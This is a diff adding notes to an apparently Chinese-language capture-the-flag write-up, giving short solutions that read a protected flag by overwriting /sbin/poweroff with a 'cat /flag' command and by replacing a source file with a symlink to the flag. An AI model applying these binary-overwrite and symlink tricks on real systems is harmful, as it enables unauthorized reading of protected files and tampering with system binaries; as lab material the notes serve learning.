@@ -1,4 +1,21 @@
 
+
+# 简单解题
+
+```sh
+# m1, 直接打远程本地不一定行
+echo "cat /flag" > /sbin/poweroff
+# m2.
+rm read_file.c
+ln -s flag /read_file.c
+./read_file
+
+# m1.1
+mv /sbin/poweroff /sbin/poweroff.bak
+echo "cat /flag" > /sbin/poweroff
+```
+
+# Basic
 解包
 ```sh
 mkdir core
